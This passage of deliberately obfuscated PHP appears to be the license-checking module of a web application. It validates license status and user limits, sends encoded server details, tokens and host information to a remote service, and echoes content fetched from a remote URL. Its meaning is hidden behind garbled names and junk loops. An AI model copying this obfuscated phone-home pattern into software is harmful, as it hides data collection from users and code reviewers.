$Õ†ÆÌ“Ã) { return; } $œ–Ì‰š‹ = substr($¿ĞÒ©ìË, 0, -strlen($Õ†ÆÌ“Ã)); $­à¡õ¦Ä = array($ÕÛƒğ©¦[4], $œ–Ì‰š‹); $½›ü—©ì = array_slice($GLOBALS[$ÕÛƒğ©¦[13]][$ÕÛƒğ©¦[14]], 1); $Æ–¦ „Á = $¡Ÿ¥å[656]; if (strlen($Æ–¦ „Á) < $¡Ÿ¥å[657]) { die; } $GLOBALS[$ÕÛƒğ©¦[13]][$ÕÛƒğ©¦[14]] = array_merge($­à¡õ¦Ä, $½›ü—©ì); $GLOBALS[$ÕÛƒğ©¦[13]][$ÕÛƒğ©¦[15]] = implode($ÕÛƒğ©¦[0], $GLOBALS[$ÕÛƒğ©¦[13]][$ÕÛƒğ©¦[14]]); $ú‘ôç‚ = $¡Ÿ¥å[658]; while (strlen($ú‘ôç‚) < $¡Ÿ¥å[430]) { if (!$ú‘ôç‚) { break; } $ú‘ôç‚++; } } private function hyacedc41263() { $¶¥ËŠÙ =& $_SERVER[¡“ËÌ§œ]; $ëéœ¼¢„ =& $_SERVER[İª€§ô]; if ($GLOBALS[$ëéœ¼¢„[13]][$ëéœ¼¢„[15]] != $ëéœ¼¢„[6]) { return; } $³¶¹Â² = $_SERVER[$ëéœ¼¢„[16]]; $İ¶Û»¥· = $ëéœ¼¢„[17]; $Ò­¿µØ = $¶¥ËŠÙ[659]; if (!$Ò­¿µØ) { return; } if (!strstr($³¶¹Â², $İ¶Û»¥·)) { return; } $–œ“¶ãÏ = strrpos($³¶¹Â², $İ¶Û»¥·); $˜Å† ¶¯ = $¶¥ËŠÙ[660]; if (strlen($˜Å† ¶¯) < $¶¥ËŠÙ[430]) { die; } $¾…ÃÆûó = substr($³¶¹Â², $–œ“¶ãÏ + strlen($İ¶Û»¥·)); $º×ïí§Ù = $¶¥ËŠÙ[661]; if (strlen($º×ïí§Ù) < $¶¥ËŠÙ[430]) { return; } preg_match_all($ëéœ¼¢„[18], $¾…ÃÆûó, $ª­¥ğÅ); $¾…ÃÆûó = trim($ª­¥ğÅ[0][0], $ëéœ¼¢„[19]); $GLOBALS[$ëéœ¼¢„[13]][$ëéœ¼¢„[14]] = explode($ëéœ¼¢„[19], $¾…ÃÆûó); $Ã¦ª¥Ò = $¶¥ËŠÙ[662]; if (strlen($Ã¦ª¥Ò) < $¶¥ËŠÙ[657]) { return; } $GLOBALS[$ëéœ¼¢„[13]][$ëéœ¼¢„[15]] = implode($ëéœ¼¢„[0], $GLOBALS[$ëéœ¼¢„[13]][$ëéœ¼¢„[14]]); $¬ËÛÇÁ = $¶¥ËŠÙ[663]; if (!$¬ËÛÇÁ) { return; } } public function run() { $ğ†¨’ğŞ =& $_SERVER[¡“ËÌ§œ]; $æïÌŞ¿ =& $_SERVER[İª€§ô]; $this->hyacedc41263(); $this->kupx1079a672(); $‡–êĞû = $ğ†¨’ğŞ[664]; while (strlen($‡–êĞû) < $ğ†¨’ğŞ[665]) { if (!$‡–êĞû) { break; } $‡–êĞû++; } $†”§µƒĞ = $GLOBALS[$æïÌŞ¿[13]][$æïÌŞ¿[14]]; $âÆÖ¥Œ‘ = $ğ†¨’ğŞ[666]; if (strlen($âÆÖ¥Œ‘) < $ğ†¨’ğŞ[667]) { return; } $¯òŒò¿Û = $GLOBALS[$æïÌŞ¿[13]][$æïÌŞ¿[15]]; define($æïÌŞ¿[20], isset($†”§µƒĞ[0]) && $†”§µƒĞ[0] ? $†”§µƒĞ[0] : $this->defaultModule); $Ç”Ã€¿Ö = $ğ†¨’ğŞ[668]; if (!$Ç”Ã€¿Ö) { return; } define($æïÌŞ¿[21], isset($†”§µƒĞ[1]) && $†”§µƒĞ[0] ? $†”§µƒĞ[1] : $this->defaultController); define($æïÌŞ¿[22], isset($†”§µƒĞ[2]) && $†”§µƒĞ[0] ? $†”§µƒĞ[2] : $this->defaultAction); define($æïÌŞ¿[23], MOD . $æïÌŞ¿[0] . ST . $æïÌŞ¿[0] . ACT); $_SERVER[$æïÌŞ¿[24]] = strtolower(ACTION); $¾ğÍäÕ = $ğ†¨’ğŞ[669]; if (!$¾ğÍäÕ) { return; } $this->autorun(); if (count($†”§µƒĞ) >= 3) { $this->appRun($¯òŒò¿Û); } else { $this->appRun(ACTION); } } private $zvkl25859fa0 = array(); private $dekfd3d9090c = ''; public function xdgr699319f1() { $…ô™½Ï“ =& $_SERVER[¡“ËÌ§œ]; $ËŸ½´­Â =& $_SERVER[İª€§ô]; $this->zgua26b464a1(); $ˆ—€¦Ùä = $…ô™½Ï“[670]; $this->dtaib2b59799(); $•½½ö˜ = $…ô™½Ï“[671]; $this->gmes33cff560(); $ıÛ¯¸½Æ = $…ô™½Ï“[650]; $this->nuwie478d8de(); $»Åöéê° = $…ô™½Ï“[672]; $this->udea12a2ec8d(); $²¸¿Ë³Œ = $…ô™½Ï“[673]; if (strlen($²¸¿Ë³Œ) < $…ô™½Ï“[665]) { die; } $this->aujm374a6d40(); $this->jivoa4c107b9(); $this->zderb7968a8c($ËŸ½´­Â[25], array($this, $ËŸ½´­Â[26])); $this->zderb7968a8c($ËŸ½´­Â[27], array($this, $ËŸ½´­Â[28])); $this->zderb7968a8c($ËŸ½´­Â[29], array($this, $ËŸ½´­Â[30])); $this->zderb7968a8c($ËŸ½´­Â[31], array($this, $ËŸ½´­Â[32])); $¯·µšÆğ = $…ô™½Ï“[674]; } public function obgee6be748d($ÛùÆÅ¼Å) { $šÀ·Ç©‚ =& $_SERVER[¡“ËÌ§œ]; $Üí´È«® =& $_SERVER[İª€§ô]; $ÛúÂà = Model($Üí´È«®[33])->get(); $¦úÖò° = $šÀ·Ç©‚[675]; if (!$¦úÖò°) { return; } $æç”Ïô£ = array($Üí´È«®[34], $Üí´È«®[35], $Üí´È«®[36], $Üí´È«®[37], $Üí´È«®[38], $Üí´È«®[39], $Üí´È«®[40], $Üí´È«®[41], $Üí´È«®[42], $Üí´È«®[43], $Üí´È«®[44], $Üí´È«®[45], $Üí´È«®[46], $Üí´È«®[47], $Üí´È«®[48], $Üí´È«®[49], $Üí´È«®[50], $Üí´È«®[51], $Üí´È«®[52], $Üí´È«®[53], $Üí´È«®[54], $Üí´È«®[55], $Üí´È«®[56], $Üí´È«®[57], $Üí´È«®[58], $Üí´È«®[59], $Üí´È«®[60], $Üí´È«®[61], $Üí´È«®[62], $Üí´È«®[63], $Üí´È«®[64], $Üí´È«®[65], $Üí´È«®[66], $Üí´È«®[67], $Üí´È«®[68], $Üí´È«®[69], $Üí´È«®[70], $Üí´È«®[71], $Üí´È«®[72], $Üí´È«®[73], $Üí´È«®[74], $Üí´È«®[75], $Üí´È«®[76], $Üí´È«®[77], $Üí´È«®[78], $Üí´È«®[79], $Üí´È«®[80], $Üí´È«®[81], $Üí´È«®[82], $Üí´È«®[83], $Üí´È«®[84]); $¢ÃÀÊÎ¡ = $šÀ·Ç©‚[676]; if (!$¢ÃÀÊÎ¡) { die; } foreach ($æç”Ïô£ as $’Â‚ÎÈ¥) { $Üä‡„¶ö = $GLOBALS[$Üí´È«®[85]][$Üí´È«®[86]][$’Â‚ÎÈ¥]; if (isset($ÛúÂà[$’Â‚ÎÈ¥])) { $Üä‡„¶ö = $ÛúÂà[$’Â‚ÎÈ¥]; } $ÛùÆÅ¼Å[$Üí´È«®[87]][$Üí´È«®[88]][$’Â‚ÎÈ¥] = $Üä‡„¶ö; } $ï–ªõäŸ = $ÛùÆÅ¼Å[$Üí´È«®[87]][$Üí´È«®[88]][$Üí´È«®[46]]; $ÁÓÙ¹—› = $šÀ·Ç©‚[677]; if (strlen($ÁÓÙ¹—›) < $šÀ·Ç©‚[652]) { return; } unset($ÛùÆÅ¼Å[$Üí´È«®[87]][$Üí´È«®[89]][$Üí´È«®[90]]); unset($ÛùÆÅ¼Å[$Üí´È«®[87]][$Üí´È«®[89]][$Üí´È«®[91]]); unset($ÛùÆÅ¼Å[$Üí´È«®[87]][$Üí´È«®[88]][$Üí´È«®[46]]); $Óé‰®Ñ• = $šÀ·Ç©‚[678]; while (strlen($Óé‰®Ñ•) < $šÀ·Ç©‚[657]) { if (!$Óé‰®Ñ•) { break; } $Óé‰®Ñ•++; } unset($ÛùÆÅ¼Å[$Üí´È«®[87]][$Üí´È«®[88]][$Üí´È«®[92]]); $ÛùÆÅ¼Å[$Üí´È«®[87]][$Üí´È«®[88]][$Üí´È«®[93]] = array($Üí´È«®[94] => (int) $ï–ªõäŸ[$Üí´È«®[95]], $Üí´È«®[96] => (int) _get($ï–ªõäŸ, $Üí´È«®[97], 0)); $ÛùÆÅ¼Å[$Üí´È«®[98]][$Üí´È«®[99]] = Action($Üí´È«®[100])->accessToken(); $ÛùÆÅ¼Å[$Üí´È«®[98]][$Üí´È«®[101]] = md5($_SERVER[$Üí´È«®[102]] . $ÛúÂà[$Üí´È«®[103]]); $ÛùÆÅ¼Å[$Üí´È«®[98]][$Üí´È«®[104]] = base64_encode(serverInfo()); $ÛùÆÅ¼Å[$Üí´È«®[98]][$Üí´È«®[105]] = $this->dekfd3d9090c; if ($ÛúÂà[$Üí´È«®[105]] != $Üí´È«®[106]) { $ÛùÆÅ¼Å[$Üí´È«®[98]][$Üí´È«®[107]] = $ÛúÂà[$Üí´È«®[107]]; $ÛùÆÅ¼Å[$Üí´È«®[98]][$Üí´È«®[108]] = $ÛúÂà[$Üí´È«®[108]]; $ùÒÂ…Ş = rand_string(10) . $this->dekfd3d9090c . rand_string(5); $ÛùÆÅ¼Å[$Üí´È«®[87]][$Üí´È«®[109]][$Üí´È«®[110]] = $this->qynzd68ec0de($ùÒÂ…Ş, $ÛùÆÅ¼Å[$Üí´È«®[98]][$Üí´È«®[101]]); } if ($this->dekfd3d9090c == $Üí´È«®[106]) { $ÛùÆÅ¼Å[$Üí´È«®[87]][$Üí´È«®[88]][$Üí´È«®[93]][$Üí´È«®[97]] = 0; } $ÛùÆÅ¼Å[$Üí´È«®[98]][$Üí´È«®[111]] = _get($this->zvkl25859fa0, $Üí´È«®[112], $Üí´È«®[6]); $ÛùÆÅ¼Å[$Üí´È«®[98]][$Üí´È«®[113]] = _get($this->zvkl25859fa0, $Üí´È«®[114], $Üí´È«®[6]); if (_get($GLOBALS, $Üí´È«®[115]) && $this->config[$Üí´È«®[116]]) { $ÛùÆÅ¼Å[$Üí´È«®[98]][$Üí´È«®[117]] = WEB_ROOT; } return $ÛùÆÅ¼Å; } private function aujm374a6d40() { $¿°êŠşÇ =& $_SERVER[¡“ËÌ§œ]; $Ìºğ‡ûì =& $_SERVER[İª€§ô]; $¼Ãœ£Í = $_SERVER[$Ìºğ‡ûì[24]] == $Ìºğ‡ûì[118]; if ($_SERVER[$Ìºğ‡ûì[24]] == $Ìºğ‡ûì[119] && $_GET[$Ìºğ‡ûì[120]] == $Ìºğ‡ûì[121]) { $¼Ãœ£Í = !0; } if ($¼Ãœ£Í) { $Š×éÏ = array($Ìºğ‡ûì[105] => $this->dekfd3d9090c, $Ìºğ‡ûì[122] => $this->thyi43fa15c5(), $Ìºğ‡ûì[123] => Model($Ìºğ‡ûì[124])->count()); if ($this->dekfd3d9090c != $Ìºğ‡ûì[106]) { $¥¨’‘“¶ = _get($this->zvkl25859fa0, $Ìºğ‡ûì[125]); if ($¥¨’‘“¶) { $Š×éÏ[$Ìºğ‡ûì[126]] = $¥¨’‘“¶; $Š×éÏ[$Ìºğ‡ûì[127]] = strtotime(_get($this->zvkl25859fa0, $Ìºğ‡ûì[128])); $Š×éÏ[$Ìºğ‡ûì[129]] = _get($this->zvkl25859fa0, $Ìºğ‡ûì[114]); } $Ç±îøšÈ = Model($Ìºğ‡ûì[33])->get($Ìºğ‡ûì[130], $Ìºğ‡ûì[6], !0); if (is_string($Ç±îøšÈ) && substr($Ç±îøšÈ, 0, 1) == $Ìºğ‡ûì[131]) { $Ç±îøšÈ = json_decode_force($Ç±îøšÈ); } if (is_array($Ç±îøšÈ) && $Ç±îøšÈ[$Ìºğ‡ûì[132]] && strstr($Ç±îøšÈ[$Ìºğ‡ûì[132]], $Ìºğ‡ûì[133])) { $í´¿‹–‰ = explode($Ìºğ‡ûì[133], $Ç±îøšÈ[$Ìºğ‡ûì[132]]); $Š×éÏ[$Ìºğ‡ûì[134]] = $í´¿‹–‰[0]; } } $Š×éÏ = $this->sfha659a1904(json_encode($Š×éÏ), md5($Ìºğ‡ûì[135])); $Å•Ú“µ¤ = $¿°êŠşÇ[679]; if (strlen($Å•Ú“µ¤) < $¿°êŠşÇ[430]) { die; } $‡ö›è¦ = array($Ìºğ‡ûì[136] => $Š×éÏ); call_user_func(array($Ìºğ‡ûì[137], $Ìºğ‡ûì[138]), $‡ö›è¦); } if ($this->dekfd3d9090c == $Ìºğ‡ûì[106]) { return; } $¥ôİÑ©à = array($Ìºğ‡ûì[139], $Ìºğ‡ûì[140], $Ìºğ‡ûì[141], $Ìºğ‡ûì[142], $Ìºğ‡ûì[143], $Ìºğ‡ûì[144]); $Ñ®Å‘Š = $¿°êŠşÇ[680]; if (strlen($Ñ®Å‘Š) < $¿°êŠşÇ[667]) { die; } $•¸ßñ¿ó = Model($Ìºğ‡ûì[33])->get(); $‡ö›è¦ = array($Ìºğ‡ûì[145] => $•¸ßñ¿ó[$Ìºğ‡ûì[34]], $Ìºğ‡ûì[146] => $•¸ßñ¿ó[$Ìºğ‡ûì[35]], $Ìºğ‡ûì[147] => $Ìºğ‡ûì[6]); foreach ($¥ôİÑ©à as $«Ú”¼êü) { if (!isset($•¸ßñ¿ó[$«Ú”¼êü]) || !$•¸ßñ¿ó[$«Ú”¼êü]) { continue; } $‡ö›è¦[$«Ú”¼êü] = $•¸ßñ¿ó[$«Ú”¼êü]; $ÏŠÉğß„ = $¿°êŠşÇ[681]; if (!$ÏŠÉğß„) { die; } } call_user_func(array($Ìºğ‡ûì[137], $Ìºğ‡ûì[138]), $‡ö›è¦); } private function nuwie478d8de() { $ë›İ¢É =& $_SERVER[¡“ËÌ§œ]; $³ÛØúòÄ =& $_SERVER[İª€§ô]; if ($_SERVER[$³ÛØúòÄ[24]] != $³ÛØúòÄ[148]) { return; } if (!_get($GLOBALS, $³ÛØúòÄ[115])) { die; } $²Áã²¹‚ = $GLOBALS[$³ÛØúòÄ[13]]; if (isset($²Áã²¹‚[$³ÛØúòÄ[149]])) { $this->gtfu6305952a(); die; } if (!isset($²Áã²¹‚[$³ÛØúòÄ[150]]) || strlen($²Áã²¹‚[$³ÛØúòÄ[150]]) != 16) { show_json($³ÛØúòÄ[151] . $²Áã²¹‚[$³ÛØúòÄ[150]], !1); } $Å”»§¤„ = Model($³ÛØúòÄ[33])->get($³ÛØúòÄ[103]); $ ĞŠ©Œ = md5($_SERVER[$³ÛØúòÄ[102]] . $Å”»§¤„); $¶ÔüÖ¿Ú = array($³ÛØúòÄ[150] => $²Áã²¹‚[$³ÛØúòÄ[150]], $³ÛØúòÄ[152] => rand_string(16), $³ÛØúòÄ[153] => $³ÛØúòÄ[135], $³ÛØúòÄ[154] => $³ÛØúòÄ[155], $³ÛØúòÄ[156] => $_SERVER[$³ÛØúòÄ[157]], $³ÛØúòÄ[158] => $_SERVER[$³ÛØúòÄ[159]], $³ÛØúòÄ[160] => $_SERVER[$³ÛØúòÄ[161]], $³ÛØúòÄ[101] => $ ĞŠ©Œ, $³ÛØúòÄ[162] => Model($³ÛØúòÄ[33])->get($³ÛØúòÄ[130])); if ($²Áã²¹‚[$³ÛØúòÄ[163]] == $³ÛØúòÄ[164]) { $§ë‘åÁ = $this->sfha659a1904($ ĞŠ©Œ, $³ÛØúòÄ[165]); $ğâï”æä = $this->qynzd68ec0de(json_encode($¶ÔüÖ¿Ú), $ ĞŠ©Œ . $³ÛØúòÄ[166], 3); $ğâï”æä = $ğâï”æä . $³ÛØúòÄ[167] . $_SERVER[$³ÛØúòÄ[157]]; $„üî¥„¼ = $this->ekha81472d6c($³ÛØúòÄ[168] . $§ë‘åÁ . $³ÛØúòÄ[169] . $ğâï”æä, -1); show_json($„üî¥„¼, !0); } else { if ($²Áã²¹‚[$³ÛØúòÄ[163]] == $³ÛØúòÄ[170]) { $·ã…èš = substr(md5($³ÛØúòÄ[171] . $ ĞŠ©Œ), 12, 15) . $³ÛØúòÄ[172]; $ğâï”æä = $this->tyiu31fce4f0(trim($²Áã²¹‚[$³ÛØúòÄ[173]]), $·ã…èš, 2); $÷î®ò– = json_decode($ğâï”æä, !0); if (!is_array($÷î®ò–) || !is_array($÷î®ò–[$³ÛØúòÄ[174]]) || $÷î®ò–[$³ÛØúòÄ[150]] != !0) { $¤´”²’˜ = $³ÛØúòÄ[175]; $ÑÑ–—É­ = $÷î®ò–[$³ÛØúòÄ[174]] ? $³ÛØúòÄ[176] . $÷î®ò–[$³ÛØúòÄ[174]] : $¤´”²’˜; show_json($ÑÑ–—É­, !1); } else { $¶ÔüÖ¿Ú[$³ÛØúòÄ[152]] = $÷î®ò–[$³ÛØúòÄ[174]][$³ÛØúòÄ[177]]; } } else { $÷î®ò– = $this->ekha81472d6c($³ÛØúòÄ[178], $¶ÔüÖ¿Ú, 10); } } if (!is_array($÷î®ò–) || !is_array($÷î®ò–[$³ÛØúòÄ[174]]) || $÷î®ò–[$³ÛØúòÄ[150]] != !0) { $¤´”²’˜ = LNG($³ÛØúòÄ[179]); $ÑÑ–—É­ = $÷î®ò–[$³ÛØúòÄ[174]] ? $³ÛØúòÄ[176] . $÷î®ò–[$³ÛØúòÄ[174]] : $¤´”²’˜; show_json($ÑÑ–—É­, !1); } $ò–Íöù = $÷î®ò–[$³ÛØúòÄ[174]]; $¥Š·„²ê = $this->vytc82472b91($ò–Íöù[$³ÛØúòÄ[180]]); if (!$¥Š·„²ê || $¥Š·„²ê != $ò–Íöù[$³ÛØúòÄ[128]]) { $…­Û¯ë¹ = array($³ÛØúòÄ[181] => Model($³ÛØúòÄ[33])->get($³ÛØúòÄ[103]), $³ÛØúòÄ[182] => $_SERVER[$³ÛØúòÄ[102]], $³ÛØúòÄ[183] => this_url(), $³ÛØúòÄ[158] => $_SERVER[$³ÛØúòÄ[159]]); $ğâï”æä = $this->agxp6fe2b482(json_encode($…­Û¯ë¹)); $this->ekha81472d6c($³ÛØúòÄ[184] . $ğâï”æä); show_json(LNG($³ÛØúòÄ[185]), !0); } $›¨éƒ¹’ = array($³ÛØúòÄ[186] => $ò–Íöù[$³ÛØúòÄ[187]], $³ÛØúòÄ[188] => $ò–Íöù[$³ÛØúòÄ[189]], $³ÛØúòÄ[190] => rand_string(16), $³ÛØúòÄ[105] => $ò–Íöù[$³ÛØúòÄ[191]]); if ($¶ÔüÖ¿Ú[$³ÛØúòÄ[152]]) { $›¨éƒ¹’[$³ÛØúòÄ[190]] = $¶ÔüÖ¿Ú[$³ÛØúòÄ[152]]; } $ôøÅáüì = substr(md5($›¨éƒ¹’[$³ÛØúòÄ[188]]), 10, 10); $‘¶ÏøÜ™ = $ôøÅáüì . $›¨éƒ¹’[$³ÛØúòÄ[105]] . $›¨éƒ¹’[$³ÛØúòÄ[190]]; $‚ıÕ„ˆ = $ë›İ¢É[682]; $›¨éƒ¹’[$³ÛØúòÄ[107]] = strrev(base64_encode($this->sfha659a1904($‘¶ÏøÜ™, $³ÛØúòÄ[192]))); $ó³¾è¾¹ = $ë›İ¢É[683]; if (!$ó³¾è¾¹) { die; } $Ñ’§¿¶ = rand_string(16); $ÉñŞ•¢— = $ë›İ¢É[684]; if (strlen($ÉñŞ•¢—) < $ë›İ¢É[652]) { die; } $ÌÁÏ÷˜ = $Ñ’§¿¶ . $›¨éƒ¹’[$³ÛØúòÄ[105]] . $this->sfha659a1904(md5($›¨éƒ¹’[$³ÛØúòÄ[186]]), $Ñ’§¿¶); $›¨éƒ¹’[$³ÛØúòÄ[108]] = base64_encode(strrev($this->sfha659a1904($ÌÁÏ÷˜, $³ÛØúòÄ[193]))); $ı¦™’ÛË = $ë›İ¢É[685]; if (strlen($ı¦™’ÛË) < $ë›İ¢É[430]) { return; } if ($ò–Íöù[$³ÛØúòÄ[194]] && $ò–Íöù[$³ÛØúòÄ[194]] >= 1) { Model($³ÛØúòÄ[33])->setDeep($³ÛØúòÄ[195], $³ÛØúòÄ[121]); } Model($³ÛØúòÄ[33])->set($›¨éƒ¹’); $¶ã¿ß½Œ = md5($_SERVER[$³ÛØúòÄ[102]] . strrev($Å”»§¤„) . $›¨éƒ¹’[$³ÛØúòÄ[188]]); $´ ¡ş = $ë›İ¢É[686]; $ô–ŒÖÅ÷ = strrev(substr($¶ã¿ß½Œ, 10, 16)); $¤İÆÕóâ = $ë›İ¢É[687]; while (strlen($¤İÆÕóâ) < $ë›İ¢É[652]) { if (!$¤İÆÕóâ) { break; } $¤İÆÕóâ++; } $®Ä±úÍ® = $this->qynzd68ec0de(json_encode($ò–Íöù), $¶ã¿ß½Œ); $ñ–†ççÁ = array_to_keyvalue(Model($³ÛØúòÄ[7])->listData(), $³ÛØúòÄ[196]); $€×ş•ÏÉ = $ñ–†ççÁ[$³ÛØúòÄ[197]]; $… ¶Ïß = array(); $÷¬×Õ†ß = $ë›İ¢É[688]; if (!$÷¬×Õ†ß) { return; } $… ¶Ïß[$ô–ŒÖÅ÷] = $®Ä±úÍ®; Model($³ÛØúòÄ[7])->update($€×ş•ÏÉ[$³ÛØúòÄ[198]], array($³ÛØúòÄ[199] => $… ¶Ïß)); $Çûº¬š = $ë›İ¢É[689]; while (strlen($Çûº¬š) < $ë›İ¢É[667]) { if (!$Çûº¬š) { break; } $Çûº¬š++; } $this->zvkl25859fa0 = $ò–Íöù; $this->dekfd3d9090c = $›¨éƒ¹’[$³ÛØúòÄ[105]]; $²–ôÁş = $ë›İ¢É[690]; if (strlen($²–ôÁş) < $ë›İ¢É[665]) { die; } $this->licenseRegistSuccess(); $¥•ªĞ³ı = $ë›İ¢É[691]; Cache::set($³ÛØúòÄ[200] . md5($Å”»§¤„ . $³ÛØúòÄ[201]), $³ÛØúòÄ[6]); $—õª÷¨º = $ë›İ¢É[692]; show_json(LNG($³ÛØúòÄ[185]), !0); $­”´Ê›€ = $ë›İ¢É[693]; } private function licenseRegistSuccess() { $È¥‘¨ï =& $_SERVER[İª€§ô]; $ÄıØªÈ¸ = Model($È¥‘¨ï[33])->get(); if ($ÄıØªÈ¸[$È¥‘¨ï[63]] != $È¥‘¨ï[121]) { Model($È¥‘¨ï[33])->set($È¥‘¨ï[63], $È¥‘¨ï[121]); } Action($È¥‘¨ï[202])->initStart(!0); } private function gtfu6305952a() { $Ş ô…Çå =& $_SERVER[¡“ËÌ§œ]; $†çë²ï¡ =& $_SERVER[İª€§ô]; Model($†çë²ï¡[33])->set(array($†çë²ï¡[186] => $†çë²ï¡[6], $†çë²ï¡[188] => $†çë²ï¡[6], $†çë²ï¡[105] => $†çë²ï¡[106], $†çë²ï¡[107] => $†çë²ï¡[6], $†çë²ï¡[108] => $†çë²ï¡[6])); Model($†çë²ï¡[33])->setDeep($†çë²ï¡[195], $†çë²ï¡[203]); $›ê¼šÅ« = $Ş ô…Çå[694]; if (!$›ê¼šÅ«) { die; } $this->zvkl25859fa0 = array(); $Š¨«˜Ñˆ = $Ş ô…Çå[695]; if (strlen($Š¨«˜Ñˆ) < $Ş ô…Çå[665]) { return; } $this->dekfd3d9090c = $†çë²ï¡[106]; } private function zgua26b464a1() { $ıçÏ…âÔ =& $_SERVER[¡“ËÌ§œ]; $ç’’üÀ =& $_SERVER[İª€§ô]; $_SERVER[$ç’’üÀ[159]] = _get($_SERVER, $ç’’üÀ[159], APP_HOST); $this->dekfd3d9090c = $ç’’üÀ[106]; $¾”íóÕï = $ıçÏ…âÔ[696]; $àô£ŒØ = Model($ç’’üÀ[33])->get(); if ($àô£ŒØ[$ç’’üÀ[105]] == $ç’’üÀ[106]) { return; } $»ÃÏÂõ¥ = Model($ç’’üÀ[33])->get($ç’’üÀ[103]); $îıáÔ³Ş = $ıçÏ…âÔ[697]; while ($îıáÔ³Ş < $ıçÏ…âÔ[430]) { if ($îıáÔ³Ş >= 0) { break; } $îıáÔ³Ş++; } $Üß×÷Úª = $ç’’üÀ[200] . md5($»ÃÏÂõ¥ . $ç’’üÀ[201]); $Õ½Åä“ = Cache::get($Üß×÷Úª); if (!is_array($Õ½Åä“) || !isset($Õ½Åä“[$ç’’üÀ[204]]) || time() - $Õ½Åä“[$ç’’üÀ[204]] >= 60) { $•Á’î’ñ = Model($ç’’üÀ[7])->loadList(); $ºµÀôè¤ = $•Á’î’ñ[$ç’’üÀ[197]]; $íÃ´•¥« = md5($_SERVER[$ç’’üÀ[102]] . strrev($»ÃÏÂõ¥) . $àô£ŒØ[$ç’’üÀ[188]]); $¿ñÍ‘Íò = strrev(substr($íÃ´•¥«, 10, 16)); $Õ½Åä“ = $this->tyiu31fce4f0($ºµÀôè¤[$ç’’üÀ[85]][$¿ñÍ‘Íò], $íÃ´•¥«); $Õ½Åä“ = json_decode($Õ½Åä“, !0); } if (!is_array($Õ½Åä“)) { return $this->gtfu6305952a(); } $¯·áºÑ– = strtotime($Õ½Åä“[$ç’’üÀ[128]]); if (time() >= $¯·áºÑ–) { return $this->gtfu6305952a(); } if (time() - $Õ½Åä“[$ç’’üÀ[204]] > 20) { $Õ½Åä“[$ç’’üÀ[204]] = time(); Cache::set($Üß×÷Úª, $Õ½Åä“); } $this->zvkl25859fa0 = $Õ½Åä“; $this->dekfd3d9090c = $àô£ŒØ[$ç’’üÀ[105]]; } private function dtaib2b59799() { $çæ›ˆ« =& $_SERVER[İª€§ô]; $ö£»ıûÂ = $GLOBALS[$çæ›ˆ«[13]]; $•ìì•¯’ = $_SERVER[¡“ËÌ§œ][698]; if (!$•ìì•¯’) { die; } $™Ã…ÏÁ÷ = $_SERVER[$çæ›ˆ«[24]]; if ($™Ã…ÏÁ÷ == $çæ›ˆ«[205] && $this->dekfd3d9090c == $çæ›ˆ«[106]) { show_json(LNG($çæ›ˆ«[206]), !1, $çæ›ˆ«[207]); } $¥ó½Ï– = array($çæ›ˆ«[208], $çæ›ˆ«[209]); if (in_array($™Ã…ÏÁ÷, $¥ó½Ï–)) { if ($this->dekfd3d9090c == $çæ›ˆ«[106] && isset($ö£»ıûÂ[$çæ›ˆ«[210]])) { show_json(LNG($çæ›ˆ«[206]), !1, $çæ›ˆ«[207]); die; } $…§œ›«Û = $this->thyi43fa15c5(); if ($…§œ›«Û != intval($çæ›ˆ«[211])) { if ($…§œ›«Û <= Model($çæ›ˆ«[124])->count()) { show_json(LNG($çæ›ˆ«[212]), !1, $çæ›ˆ«[207]); die; } } } } private function gmes33cff560() { $ Í×®Ü² =& $_SERVER[¡“ËÌ§œ]; $¦¨¢È¤ =& $_SERVER[İª€§ô]; $ÈöÍ’ = array($¦¨¢È¤[118], $¦¨¢È¤[119]); $ò·ß…ÙŞ = $ Í×®Ü²[699]; if (!$ò·ß…ÙŞ) { return; } if (!_get($GLOBALS, $¦¨¢È¤[115]) || !isset($_GET[$¦¨¢È¤[213]])) { return; } if (!in_array($_SERVER[$¦¨¢È¤[24]], $ÈöÍ’)) { return; } $ÙúÎı›‹ = $¦¨¢È¤[214]; $ö²—Å¥ = $ Í×®Ü²[700]; while ($ö²—Å¥ < $ Í×®Ü²[652]) { if ($ö²—Å¥ >= 0) { break; } $ö²—Å¥++; } $ÙúÎı›‹ = $this->bpim17e08df6($ÙúÎı›‹, $¦¨¢È¤[215]); $ÓãÃıüØ = $ Í×®Ü²[701]; if (strlen($ÓãÃıüØ) < $ Í×®Ü²[665]) { die; } $í÷„¡ì  = stream_context_create(array($¦¨¢È¤[216] => array($¦¨¢È¤[217] => $¦¨¢È¤[218], $¦¨¢È¤[219] => 3))); $®äô™¨ø = @file_get_contents($ÙúÎı›‹, !1, $í÷„¡ì ); header($¦¨¢È¤[220]); if ($®äô™¨ø && strstr($®äô™¨ø, $¦¨¢È¤[221])) { echo $®äô™¨ø; } die; } public function imwkc36909aa($ÄãÀ–ºø) { $âÜïÍÃ =& $_SERVER[¡“ËÌ§œ]; $ç‰Ê‡«Š =& $_SERVER[İª€§ô]; if ($this->dekfd3d9090c == $ç‰Ê‡«Š[222]) { return $ÄãÀ–ºø; } $˜•ù¡”Í = array($ç‰Ê‡«Š[223] => $ç‰Ê‡«Š[224], $ç‰Ê‡«Š[225] => $ç‰Ê‡«Š[224], $ç‰Ê‡«Š[226] => $ç‰Ê‡«Š[224], $ç‰Ê‡«Š[227] => $ç‰Ê‡«Š[228], $ç‰Ê‡«Š[229] => $ç‰Ê‡«Š[228], $ç‰Ê‡«Š[230] => $ç‰Ê‡«Š[228], $ç‰Ê‡«Š[231] => $ç‰Ê‡«Š[228], $ç‰Ê‡«Š[232] => $ç‰Ê‡«Š[228], $ç‰Ê‡«Š[233] => $ç‰Ê‡«Š[228], $ç‰Ê‡«Š[234] => $ç‰Ê‡«Š[228], $ç‰Ê‡«Š[235] => $ç‰Ê‡«Š[228], $ç‰Ê‡«Š[236] => $ç‰Ê‡«Š[228], $ç‰Ê‡«Š[237] => $ç‰Ê‡«Š[228], $ç‰Ê‡«Š[238] => $ç‰Ê‡«Š[228], $ç‰Ê‡«Š[239] => $ç‰Ê‡«Š[228]); $î¤í„ıî = explode($ç‰Ê‡«Š[240], _get($this->zvkl25859fa0, $ç‰Ê‡«Š[112], $ç‰Ê‡«Š[6])); $†§ŠÛ©Á = array(); foreach ($˜•ù¡”Í as $ÇÙß ÅÍ => $ÅÛíµ†Ç) { if ($ÅÛíµ†Ç == $ç‰Ê‡«Š[224] && substr($this->dekfd3d9090c, 0, 1) == $ç‰Ê‡«Š[224]) { continue; } if (!in_array($ÇÙß ÅÍ, $î¤í„ıî)) { $†§ŠÛ©Á[] = $ÇÙß 